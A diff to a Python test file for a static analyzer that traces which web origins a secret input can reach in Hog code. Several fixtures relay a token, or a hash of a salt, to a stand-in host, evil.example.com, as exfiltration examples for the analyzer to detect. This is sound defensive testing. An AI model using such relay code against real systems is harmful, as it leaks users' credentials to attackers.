@@ -1,13 +1,23 @@
 import json
+from contextlib import nullcontext
 from pathlib import Path
 from typing import Any
+
+from unittest.mock import patch
 
 from django.test import SimpleTestCase
 
 from parameterized import parameterized
-from prometheus_client import REGISTRY
 
-from products.cdp.backend.secret_origins import UNBOUND, SecretOrigins, secret_origins, url_origin
+from products.cdp.backend.secret_origins import (
+    UNBOUND,
+    SecretOrigins,
+    SecretOriginsAnalysis,
+    UnanalyzableReason,
+    analyze_secret_origins,
+    secret_origins,
+    url_origin,
+)
 
 # The Node worker's tests read the same table, so the origin stored here and the origin the worker compares agree.
 ORIGIN_CASES = json.loads(
@@ -473,11 +483,75 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": _origins("https://hooks.example.com")},
             ),
             (
-                "unparseable_code",
-                "fetch(inputs.url, {",
-                _inputs(url="https://hooks.example.com", token="t"),
+                "secret_serialized_into_a_json_body",
+                "fetch('https://api.example.com', {'body': jsonStringify({'k': inputs.token})})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://api.example.com")},
+            ),
+            (
+                "secret_converted_to_an_integer",
+                "fetch('https://api.example.com', {'body': {'id': toInt(inputs.token)}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://api.example.com")},
+            ),
+            (
+                "secret_converted_to_a_float",
+                "fetch('https://api.example.com', {'body': {'rate': toFloat(inputs.token)}})",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://api.example.com")},
+            ),
+            (
+                "fetch_in_an_inline_element_callback",
+                "arrayMap((x) -> fetch('https://hooks.example.com', {'body': x}), [inputs.token])",
+                _inputs(token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com")},
+            ),
+            (
+                "secret_printed_in_an_inline_element_callback",
+                "arrayFilter((x) -> { print(x)\nreturn true }, [inputs.token])",
+                _inputs(token="t"),
                 {"token"},
                 {"token": UNBOUND},
+            ),
+            (
+                "response_forwarded_through_a_function",
+                f"fun relay(res) {{ return res.body }}\nlet r := {SENDS_TOKEN_TO_URL}\n"
+                "fetch('https://evil.example.com', {'body': relay(r)})",
+                _inputs(url="https://hooks.example.com", token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
+            ),
+            (
+                "digest_forwarded_through_a_lambda",
+                "let sign := (v) -> sha256Hex(v)\nfetch('https://evil.example.com', {'body': sign(inputs.salt)})",
+                _inputs(salt="s"),
+                {"salt"},
+                {"salt": _origins("https://evil.example.com")},
+            ),
+            (
+                "response_logged_through_a_function",
+                f"fun relay(res) {{ return res.body }}\nlet r := {SENDS_TOKEN_TO_URL}\nprint(relay(r))",
+                _inputs(url="https://hooks.example.com", token="t"),
+                {"token"},
+                {"token": _origins("https://hooks.example.com")},
+            ),
+            (
+                "digest_logged_through_a_lambda",
+                "let sign := (v) -> sha256Hex(v)\nprint(sign(inputs.salt))",
+                _inputs(salt="s"),
+                {"salt"},
+                {"salt": _origins()},
+            ),
+            (
+                "secret_logged_through_a_lambda",
+                "let same := (v) -> v\nprint(same(inputs.salt))",
+                _inputs(salt="s"),
+                {"salt"},
+                {"salt": UNBOUND},
             ),
         ]
     )
@@ -486,13 +560,29 @@ class TestSecretHosts(SimpleTestCase):
     ) -> None:
         assert secret_origins(hog, inputs, [], secret_keys) == expected
 
-    def test_code_too_costly_to_analyze_leaves_its_secrets_unbound(self) -> None:
-        hog = "\n".join(f"let v{index} := concat(inputs.token, 'a', 'b', 'c')" for index in range(3000))
-        labels = {"reason": "budget"}
-        before = REGISTRY.get_sample_value("posthog_cdp_secret_origins_unanalyzable_total", labels) or 0
+    @parameterized.expand(
+        [
+            ("unsupported_code", f"let fetch := print\n{SENDS_TOKEN_TO_URL}", {}, None),
+            ("input_cycle", SENDS_TOKEN_TO_URL, {"url": "{inputs.next}", "next": "{inputs.url}"}, None),
+            ("iterations", f"let u := inputs.url\n{SENDS_TOKEN_TO_URL}", {}, ("_MAX_ITERATIONS", 1)),
+            ("budget", SENDS_TOKEN_TO_URL, {}, ("_MAX_EVALUATIONS", 1)),
+            ("unparseable", "fetch(inputs.url, {", {}, None),
+            (
+                "too_deep",
+                f"fetch('https://hooks.example.com', {{'body': {'concat(' * 400}inputs.token{')' * 400}}})",
+                {},
+                None,
+            ),
+        ]
+    )
+    def test_code_it_cannot_analyze_leaves_its_secrets_unbound(
+        self, reason: UnanalyzableReason, hog: str, inputs: dict[str, str], limit: tuple[str, int] | None
+    ) -> None:
+        all_inputs = _inputs(**{"url": "https://hooks.example.com", "token": "t", **inputs})
+        with patch(f"products.cdp.backend.secret_origins.{limit[0]}", limit[1]) if limit else nullcontext():
+            analysis = analyze_secret_origins(hog, all_inputs, [], {"token"})
 
-        assert secret_origins(hog, _inputs(token="t"), [], {"token"}) == {"token": UNBOUND}
-        assert REGISTRY.get_sample_value("posthog_cdp_secret_origins_unanalyzable_total", labels) == before + 1
+        assert analysis == SecretOriginsAnalysis(origins={"token": UNBOUND}, unanalyzable=reason)
 
     def test_mapping_inputs_add_their_origins(self) -> None:
         mapping_inputs = [_inputs(url="https://mapped.example.com/a")]
